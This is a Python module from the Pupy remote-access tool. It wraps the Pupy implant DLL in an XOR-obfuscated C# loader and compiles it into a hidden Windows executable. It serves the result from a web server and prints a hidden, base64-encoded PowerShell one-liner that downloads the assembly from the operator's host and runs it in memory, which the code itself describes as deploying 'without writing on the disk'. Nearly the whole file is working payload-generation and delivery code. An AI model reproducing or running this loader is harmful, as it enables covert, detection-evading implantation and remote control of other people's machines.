# -*- coding: utf-8 -*-
#Author: @n1nj4sec
#Contributor(s):

import os
import subprocess
import tempfile
import random
import shlex

from string import ascii_uppercase, ascii_lowercase
from os.path import join, splitext
from base64 import b64encode

from pupylib.PupyOutput import Success, Error, List
from pupylib import ROOT

TEMPLATE = join(ROOT, 'payload_templates', 'PupyLoaderTemplate.cs')

PS_TEMPLATE = \
  "[Reflection.Assembly]::Load(" \
  "(new-object net.webclient).DownloadData(" \
  "'http://{link_ip}:{port}{landing_uri}')).GetTypes()[0].GetMethods(" \
  ")[0].Invoke($null,@())"

class DotNetPayload(object):
    def __init__(self, display, server, conf, rawdll, outpath=None, output_dir=None):
        self.server = server
        self.display = display
        self.conf = conf
        self.outpath = outpath
        self.output_dir = output_dir
        self.rawdll = rawdll

    def gen_source(self, random_path=False):
        with open(TEMPLATE, 'rb') as f:
            template_source = f.read()

        self.display(Success('packing pupy into C# source ...'))

        encoded = '{' + ','.join(str(ord(c)^0xFF) for c in self.rawdll) + '}'
        content = template_source.replace('<PUPYx64_BYTES>', encoded)

        if not self.outpath or random_path:
            outfile = tempfile.NamedTemporaryFile(
                dir=self.output_dir or '.',
                prefix='pupy_',
                suffix='.cs',
                delete=False
            )
        else:
            outpath_src, _ = splitext(self.outpath) + '.cs'
            outfile = open(outpath_src, 'w')

        outfile.write(content)
        outfile.close()
        return outfile.name

    def gen_exe(self, options=''):
        sourcepath = self.gen_source(random_path=True)

        if not self.outpath:
            outfile = os.path.join(
                self.output_dir or '.', 'pupy_'+''.join(
                    random.choice(
                        ascii_uppercase + ascii_lowercase) for _ in range(8)) + '.exe')
        else:
            outfile = self.outpath

        try:
            command = ['mcs']

            sdk = self.server.config.get('gen', 'mcs_sdk', 4)
            options = ' '.join([
                options,
                self.server.config.get('gen', 'mcs_options', '') or ''
            ])

            if options:
                command.extend(shlex.split(options))

            if not self.conf.get('debug', False):
                if '-target:' not in options:
                    command.append('-target:winexe')

                if '-debug' not in options:
                    command.append('-debug-')

                if '-optimize' not in options:
                    command.append('-optimize+')

            command.extend([
                '-unsafe',
                '-noconfig',
                '-sdk:{}'.format(sdk),
                '-OUT:{}'.format(outfile),
                sourcepath
            ])

            self.display(Success('compiling via mono command: {}'.format(' '.join(command))))

            try:
                output = subprocess.check_output(command).strip()
                if output:
                    self.display(output)

            except subprocess.CalledProcessError as e:
                self.display(Error('Mono compilation failed: {}'.format(e.output)))
                return None

            except OSError:
                self.display(Error("mcs compiler can't be found ... install mono-mcs package"))
                return None

        finally:
            os.unlink(sourcepath)

        return outfile


def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    if not server.pupweb:
        display(Error('Webserver disabled'))
        return

    dn = DotNetPayload(display, server, conf, rawdll)
    exe_path = dn.gen_exe(options='-target:library')

    with open(exe_path, 'rb') as r:
        payload = r.read()

    os.unlink(exe_path)

    landing_uri = server.pupweb.serve_content(payload, alias='.NET payload')

    command = PS_TEMPLATE.format(
        link_ip=link_ip,
        port=server.pupweb.port,
        landing_uri=landing_uri
    ).encode('utf-16le')

    display(List([
        'powershell -w hidden -enc "{}"'.format(
            b64encode(command)),
    ], caption=Success(
        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
